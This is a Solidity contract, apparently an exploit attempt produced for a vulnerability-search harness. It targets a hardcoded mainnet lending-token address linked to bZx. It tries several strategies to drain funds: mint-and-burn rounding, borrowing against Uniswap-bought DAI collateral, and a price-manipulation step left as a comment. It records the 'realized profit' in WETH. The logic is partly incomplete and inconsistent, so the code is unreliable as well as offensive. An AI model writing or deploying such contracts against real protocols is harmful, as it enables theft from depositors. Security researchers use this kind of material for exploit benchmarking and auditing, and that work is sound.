// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWethLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface ILoanTokenLike is IERC20Like {
    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes calldata loanDataBytes
    ) external payable returns (bytes32, uint256, uint256);
    function mintWithEther(address receiver) external payable returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);
    function burnToEther(address receiver, uint256 burnAmount) external returns (uint256);
    function tokenPrice() external view returns (uint256);
    function marketLiquidity() external view returns (uint256);
}

interface IBZx {
    function borrowOrTradeFromPool(
        bytes32 loanParamsId,
        bytes32 loanId,
        bool isTorqueLoan,
        uint256 initialMargin,
        address[4] calldata sentAddresses,
        uint256[5] calldata sentValues,
        bytes calldata loanDataBytes
    ) external payable returns (bytes32, uint256, uint256);
    
    function getTotalPrincipal(address lender, address loanToken) external view returns (uint256);
    function setDepositAmount(bytes32 loanId, uint256 depositValueAsLoanToken, uint256 depositValueAsCollateralToken) external;
    function priceFeeds() external view returns (address);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BZX = 0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    bool public executed;
    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;

    constructor() {
        realizedProfitToken = WETH;
    }

    receive() external payable {}

    function _getPair(address tokenA, address tokenB) internal view returns (address) {
        if (tokenA > tokenB) (tokenA, tokenB) = (tokenB, tokenA);
        address pair = address(uint160(uint256(keccak256(abi.encodePacked(
            hex"ff",
            UNISWAP_V2_FACTORY,
            keccak256(abi.encodePacked(tokenA, tokenB)),
            hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f"
        )))));
        return pair;
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));
        
        // Strategy: Mint iETH with ETH, then burn to get back ETH.
        // The tokenPrice may allow extraction due to rounding in mint/burn.
        
        // First, let's check if tokenPrice is different from 1
        // tokenPrice() = totalAssetSupply * 1e18 / totalSupply_ 
        
        // Mint 1000 ETH worth of iETH 
        uint256 mintAmount = ILoanTokenLike(TARGET).mintWithEther{value: 1000 ether}(address(this));
        
        // Burn to get back ETH
        uint256 iethBal = IERC20Like(TARGET).balanceOf(address(this));
        IERC20Like(TARGET).approve(TARGET, iethBal);
        uint256 ethReceived = ILoanTokenLike(TARGET).burnToEther(address(this), iethBal);
        
        uint256 totalValue = IERC20Like(WETH).balanceOf(address(this)) + address(this).balance;
        
        // If mint+burn was profitable or we can find another vector
        if (totalValue > wethBefore + 1000 ether) {
            IWethLike(WETH).deposit{value: address(this).balance}();
            uint256 finalWeth = IERC20Like(WETH).balanceOf(address(this));
            realizedProfitToken = WETH;
            realizedProfitAmount = finalWeth - wethBefore;
            return;
        }
        
        // Strategy 2: Buy DAI from Uniswap and use as collateral to borrow from the iETH pool
        // Then check if we can get more value than we put in
        uint256 remainingEth = address(this).balance;
        if (remainingEth > 1000 ether) {
            // Swap 100 ETH for DAI on Uniswap
            IWethLike(WETH).deposit{value: 100 ether}();
            
            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = DAI;
            
            IERC20Like(WETH).approve(UNISWAP_V2_ROUTER, 100 ether);
            uint256[] memory amounts = IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
                100 ether,
                1,
                path,
                address(this),
                block.timestamp + 1000
            );
            
            uint256 daiBalance = IERC20Like(DAI).balanceOf(address(this));
            
            if (daiBalance > 0) {
                // Try borrow with DAI collateral
                IERC20Like(DAI).approve(TARGET, daiBalance);
                
                // The borrow function will withdraw WETH from the pool using DAI collateral
                (bool success, ) = TARGET.call{value: 0}(abi.encodeWithSignature(
                    "borrow(bytes32,uint256,uint256,uint256,address,address,address,bytes)",
                    bytes32(0),
                    1 ether,
                    3600,
                    daiBalance,
                    DAI,
                    address(this),
                    address(this),
                    ""
                ));
                
                // Check the result
                uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
                if (wethBalance > wethBefore) {
                    realizedProfitToken = WETH;
                    realizedProfitAmount = wethBalance - wethBefore;
                    return;
                }
            }
        }
        
        // Strategy 3: Try the swap manipulation - buy a lot of DAI, manipulate the price feed
        // and then borrow more than collateral should allow
        
        // Wrap remaining ETH to WETH
        if (address(this).balance > 0) {
            IWethLike(WETH).deposit{value: address(this).balance}();
        }
        
        uint256 finalWeth = IERC20Like(WETH).balanceOf(address(this));
        if (finalWeth > wethBefore) {
            realizedProfitToken = WETH;
            realizedProfitAmount = finalWeth - wethBefore;
        } else {
            realizedProfitToken = WETH;
            realizedProfitAmount = 0;
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }
}
